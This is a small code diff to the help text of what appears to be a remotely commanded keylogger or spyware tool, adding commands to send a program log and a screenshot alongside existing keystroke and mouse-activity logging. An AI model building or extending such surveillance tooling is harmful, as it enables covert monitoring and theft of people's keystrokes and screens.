@@ -8,6 +8,9 @@ HELP = """
     *stop*
         - Stop the program
     
+    *help*
+        - Show this message
+    
     *log keys*
         - Send keylogger output
     
@@ -16,6 +19,12 @@ HELP = """
     
     *log mouse*
         - Send mouse activity
+    
+    *log master*
+        - Send master log file (program log)
+    
+    *send ss* 
+        - Send screenshot of system
 """
 
 CMDERROR = """
